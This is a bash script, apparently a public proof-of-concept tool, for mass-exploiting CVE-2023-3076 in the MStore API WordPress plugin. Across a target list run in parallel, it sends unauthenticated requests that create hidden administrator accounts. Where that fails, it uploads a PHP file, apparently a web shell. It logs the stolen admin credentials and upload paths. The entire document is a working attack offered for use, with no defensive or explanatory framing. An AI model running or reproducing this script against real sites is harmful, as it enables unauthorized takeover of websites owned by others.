#!/bin/bash
# MStore API < 3.9.9 - Unauthenticated Privilege Escalation + PHP File Upload
# Created By Im-Hanzou
# Using GNU Parallel
# Usage Linux or WSL: 'bash msaper.sh list.txt thread'
# Usage for GitBash: 'TMPDIR=/tmp bash msaper.sh list.txt thread'

yellow='\033[1;33m'
classic='\033[0m'
cyan='\033[1;36m'

banner=$(cat << "EOF"
 ___  ___  __   ___  ____   ____ ____
 ||\\//|| (( \ // \\ || \\ ||    || \\
 || \/ ||  \\  ||=|| ||_// ||==  ||_//
 ||    || \_)) || || ||    ||___ || \\
                                      
EOF
)

printf "${cyan}$banner${classic}\n"
printf "${yellow}CVE-2023-3076 Mass Add Admin + PHP File Upload${classic}\n\n"
printf "Created By ${yellow}Im-Hanzou${classic}\n"
printf "Github: ${yellow}im-hanzou${classic}\n\n"

touch vuln.txt notvuln.txt results.txt uploaded.txt

exploit() {
    red='\033[1;31m'
    green='\033[1;32m'
    classic='\033[0m'
    target=$1
    thread=$2
    vuln="3.9.9"
    username=$(head /dev/urandom | tr -dc 'a-z' | head -c 8)
    maildomain=$(head /dev/urandom | tr -dc 'a-z' | head -c 8)
    email="${username}@${maildomain}.cc"
    password=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 12)

    if [[ ! $target =~ ^https?:// ]]; then
        target="https://$target" 
    fi 
  
    version=$(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-content/plugins/mstore-api/readme.txt" | awk '/Stable tag:       / {print $3}')
    if [ -n "$version" ]; then
        if [[ $version == $vuln || $version < $vuln ]]; then
            if xploit=$(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-json/api/flutter_wholesale/register" -H "Content-Type: application/json" --data "{\"username\":\"${username}\",\"email\":\"${email}\",\"role\":\"administrator\",\"password\":\"${password}\"}") && [[ $xploit =~ "${username}" ]]; then
                printf "${green}[ Vuln! User Added : ${username} ]${classic} => [ $target ]\n";
                echo "$target" >> vuln.txt
                echo -e "Site: $target/wp-login.php\nEmail: ${email}\nUsername: ${username}\nPassword: ${password}\n\n" >> results.txt
            elif [[ $xploit =~ "${username}" ]]; then
                printf "${green}[ Already Added ]${classic} => $target\n";
            elif [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure -X POST "$target/wp-json/api/flutter_woo/config_file" --compressed -F 'file=@config.tifa.json.php;type=application/json') =~ 'config.tifa.json.php' ]]; then
                printf "${green}[ Vuln! Uploaded ]${classic} => [ $target ]\n";
                echo "$target/wp-content/uploads/2000/01/config.tifa.json.php" >> uploaded.txt
            else
                printf "${red}[ Not Vuln ]${classic} => $target\n";
                echo "$target" >> notvuln.txt
            fi
        else
            printf "${red}[ Version Not Vuln ]${classic} => $target\n";
            echo "$target" >> notvuln.txt
        fi
    else
        printf "${red}[ Not MStore API! ]${classic} => $target\n";
        echo "$target" >> notvuln.txt
    fi
}

export -f exploit
parallel -j $2 exploit :::: $1

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "${yellow}Total Vuln : $total\n"
printf "Total Not Vuln : $totalb${classic}\n"
